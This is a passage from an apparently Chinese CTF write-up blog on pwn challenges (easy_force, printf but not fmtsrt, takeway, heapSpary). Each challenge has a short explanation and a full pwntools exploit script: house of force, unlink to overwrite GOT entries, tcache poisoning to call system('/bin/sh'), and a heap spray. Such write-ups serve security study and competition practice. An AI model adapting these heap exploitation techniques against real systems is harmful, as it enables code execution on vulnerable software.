class="line">index=-((stack_base-attach)//<span class="number">8</span>)</span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;unt?&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">sla(<span class="string">b&#x27;much?&#x27;</span>,<span class="built_in">str</span>(backdoor).encode())</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>这种方法，远程可能会有的问题，更稳妥还是利用整数溢出，<strong>刚开始没看出来溢出，菜哭惹</strong></p><p><img src="/2023/09/21/2023-ycbfinal/image-20230921231722098.png" alt="image-20230921231722098"></p><p>这里v3作为__int64 v1[3];作为数组下标还需要乘以8，从而成负数溢出为正数，就可以改返回地址为后门</p><h2 id="easy-force"><a href="#easy-force" class="headerlink" title="easy_force"></a>easy_force</h2><p>Ubuntu GLIBC 2.23-0ubuntu11.3的libc</p><p>堆溢出，只能申请四个堆，无其他功能，打house of force，改malloc为ogg</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn.bak&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># db(&#x27;0x04008C6&#x27;)#malloc</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">idx</span>):</span><br><span class="line">  sla(<span class="string">b&#x27; away\n&#x27;</span>,<span class="built_in">str</span>(idx).encode()) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ask</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">  menu(<span class="number">1</span>)</span><br><span class="line">  sla(<span class="string">b&#x27;ex?\n&#x27;</span>,<span class="built_in">str</span>(idx).encode()) </span><br><span class="line">  sla(<span class="string">b&#x27;want?\n&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">  sla(<span class="string">b&#x27;rite?\n&#x27;</span>,content)</span><br><span class="line">ask(<span class="number">0</span>,<span class="number">0x50000</span>,<span class="string">b&#x27;ff&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;road on &#x27;</span>)</span><br><span class="line">libcbase=<span class="built_in">int</span>(ru(<span class="string">b&#x27; is&#x27;</span>),<span class="number">16</span>)- <span class="number">0x581010</span></span><br><span class="line">ogg=[x + libcbase <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]]</span><br><span class="line">payload=flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">ask(<span class="number">1</span>,<span class="number">1</span>,payload)</span><br><span class="line">ru(<span class="string">b&#x27;road on &#x27;</span>)</span><br><span class="line">topchunk=<span class="built_in">int</span>(ru(<span class="string">b&#x27; is&#x27;</span>),<span class="number">16</span>)+<span class="number">0x10</span></span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libcbase)</span><br><span class="line">p(<span class="string">&#x27;top&#x27;</span>,topchunk)</span><br><span class="line">offset=elf.got[<span class="string">&#x27;malloc&#x27;</span>]-<span class="number">0x20</span>-topchunk</span><br><span class="line">ask(<span class="number">2</span>,offset,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">ask(<span class="number">3</span>,<span class="number">1</span>,p64(ogg[<span class="number">3</span>]))</span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">b&#x27;ex?\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>).encode()) </span><br><span class="line">sla(<span class="string">b&#x27;want?\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="printf-but-not-fmtsrt"><a href="#printf-but-not-fmtsrt" class="headerlink" title="printf but not fmtsrt"></a>printf but not fmtsrt</h2><p>libc2.36 存在后门和uaf，限制了堆块大小，没开pie可以利用堆指针数组里的堆地址，绕过unlink检查，将堆指针数组的地址写入其中，从而控制putsgot为后门</p><p>踩的一个坑就是unlink时会检查堆块的0x20处偏移是否为0，所以edit时用sendline会使+0x20处为一个‘\n’，从而导致unlink失败</p><p><img src="/2023/09/21/2023-ycbfinal/image-20230922130626468.png" alt="image-20230922130626468"></p><p>触发unlink的堆构造</p><p><img src="/2023/09/21/2023-ycbfinal/image-20230922134116399.png" alt="image-20230922134116399"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">idx</span>):</span><br><span class="line">  sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(idx).encode()) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">  menu(<span class="number">1</span>)</span><br><span class="line">  sla(<span class="string">b&#x27;ndex: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">  sla(<span class="string">b&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">  menu(<span class="number">2</span>)</span><br><span class="line">  sla(<span class="string">b&#x27;ndex: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">  menu(<span class="number">3</span>) </span><br><span class="line">  sla(<span class="string">b&#x27;ndex: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">  sa(<span class="string">b&#x27;tent: &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">  menu(<span class="number">4</span>)</span><br><span class="line">  sla(<span class="string">b&#x27;ndex: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">backdoor=<span class="number">0x4011D6</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x520</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x530</span>)<span class="comment">#切割unsortedbin，使edit可以修改到堆块头部开始处</span></span><br><span class="line">edit(<span class="number">1</span>, flat([<span class="number">0</span>, <span class="number">0x521</span>, <span class="number">0x4040E8</span> - <span class="number">0x18</span>, <span class="number">0x4040E8</span> - <span class="number">0x10</span>]))</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">delete(<span class="number">2</span>)<span class="comment">#触发unlink</span></span><br><span class="line">edit(<span class="number">1</span>,flat(<span class="number">0</span>,<span class="number">0</span>,elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">edit(<span class="number">0</span>,p64(backdoor))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 蓝帽杯</title>
      <link href="/2023/09/15/2023-lmb/"/>
      <url>/2023/09/15/2023-lmb/</url>
      
        <content type="html"><![CDATA[<h2 id="takeway"><a href="#takeway" class="headerlink" title="takeway"></a>takeway</h2><p>libc2.31的uaf，可以直接覆盖tcache的next来任意地址申请堆块</p><p>思路就是通过uaf和tcache的key泄露出堆地址就可以获得我们申请的堆地址，申请到0x4040A0处的堆管理结构指针后就可以改他的值为我们可控的堆，提前把可控堆里的内容改完free的got edit功能时就可以泄露基地址和修改freegot为system</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./takeway&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,name,remark</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Please input your choose: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Please input your order index&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Please input your food name: &#x27;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;a remark: &#x27;</span>)</span><br><span class="line">    io.send(remark)<span class="comment">#second 8</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Please input your choose: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Please input your order index&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Please input your choose: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Please input index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;New food name is: &#x27;</span>)</span><br><span class="line">    io.send(name)<span class="comment">#first 8</span></span><br><span class="line">command=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">dir /home/grxer/share/libc-source/glibc-2.31/malloc</span></span><br><span class="line"><span class="string">b *0x004013E8</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io,command)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#edit泄露堆地址，修改tcache的next指针</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Please input your choose: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Please input index: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">ru(<span class="string">b&#x27;r is: &#x27;</span>)</span><br><span class="line">heap=uu64(r(<span class="number">4</span>))</span><br><span class="line">heap0=heap+ <span class="number">0x12d0</span></span><br><span class="line">p(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;New food name is: &#x27;</span>)</span><br><span class="line">io.send(p64(<span class="number">0x4040A0</span>))<span class="comment">#first 8</span></span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;c&#x27;</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line"><span class="comment">#heap0就变为堆管理结构,freegot变为了第一个堆对象</span></span><br><span class="line">add(<span class="number">3</span>,p64(heap0),<span class="string">b&#x27;fake&#x27;</span>)<span class="comment">#malloc 0x4040A0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#edit泄露putsgot和修改freegot</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Please input your choose: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Please input index: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>).encode())</span><br><span class="line">ru(<span class="string">b&#x27;r is: &#x27;</span>)</span><br><span class="line">puts_ad=uu64(r(<span class="number">6</span>))</span><br><span class="line">libcbase=find_libc(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">system=libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;New food name is: &#x27;</span>)</span><br><span class="line">io.send(p64(system))<span class="comment">#first 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="heapSpary"><a href="#heapSpary" class="headerlink" title="heapSpary"></a>heapSpary</h2><p>Create堆里是一次申请16个堆，堆块的顺序是乱的，在往堆写数据时没有限制大小可以无限堆溢出</p><p>Action是一个后门</p><p><img src="/2023/09/15/2023-lmb/image-20230916223113773.png" alt="image-20230916223113773"></p><p>我们需要堆+堆大小处存放的地址的前四个字节为0，后四个字节为system就可以拿到flag</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*(<span class="type">void</span>*)(heap_ptr+size)------&gt;<span class="number">0</span></span><br><span class="line">                              system</span><br></pre></td></tr></table></figure><p>泄露libc，虽然有堆溢出，但是却在输入后有\x00截断常规unsortedbin泄露就失效了，但是Create堆时flag是往堆+堆size位置写入四个字节可以覆盖掉这个&#x2F;x00</p><p>比如我们申请creat大小为1，这个值只会覆盖unsorted堆的fd及bk的第一个bit，如果bk此时指向是unsortedbin就可以泄露出libc，所以可以利用创建大小为1的堆块切割unsortedbin来泄露libc</p><p>有了libc就是需要布置满足后门的堆块，可以申请0x20000大小的堆来mmap内存，但是这道题开了pie，mmap的位置是随机的，但是随机的不多，程序一次申请16个来堆喷，基本上位置都在libc下面偏移0x24f000处得到</p><p>利用mmap堆喷在libc下面布置大量的p32(0)+p32(systme)，我们把这个位置叫slide</p><p>再利用creat堆溢出往堆上写大量的p32(slide)，由于creat是乱序的，当出现下面的情况时</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">heapA+<span class="number">10</span>,heapA</span><br></pre></td></tr></table></figure><p>heapA堆溢出大量的p32(slide)就可以覆盖掉heapA+10堆块，就可以绕过Create里Which flag do you want?的赋值</p><p><img src="/2023/09/15/2023-lmb/image-20230916230005552.png" alt="image-20230916230005552"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./main&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+<span class="built_in">hex</span>(x)+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;ose : &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">creat</span>(<span class="params">size,data,flag</span>):</span><br><span class="line">   menu(<span class="number">1</span>)</span><br><span class="line">   sla(<span class="string">b&#x27;need : &#x27;</span>,<span class="built_in">str</span>(size).encode()) </span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">       sla(<span class="string">b&#x27; data.&#x27;</span>,data)</span><br><span class="line">       sla(<span class="string">b&#x27;want?&#x27;</span>,<span class="built_in">str</span>(flag).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">  menu(<span class="number">2</span>)</span><br><span class="line">  sla(<span class="string">b&#x27;index : &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">  menu(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">idx</span>):</span><br><span class="line">  menu(<span class="number">5</span>)</span><br><span class="line">  sla(<span class="string">b&#x27;index : &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbpie(0x00017AC)#malloc</span></span><br><span class="line">creat(<span class="number">0x200</span>,<span class="string">b&#x27;&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">creat(<span class="number">0x200</span>,<span class="string">b&#x27;&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">delete()</span><br><span class="line">delete()</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line"><span class="comment">#切割unsortedbin，泄露libc</span></span><br><span class="line">creat(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>,<span class="number">1</span>)</span><br><span class="line">b()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">  show(<span class="number">0</span>)</span><br><span class="line">  ru(<span class="string">b&#x27;is a&#x27;</span>)</span><br><span class="line">  r(<span class="number">3</span>)  </span><br><span class="line">  libcbase=uu32(r(<span class="number">4</span>))</span><br><span class="line">  <span class="keyword">if</span> libcbase&gt;<span 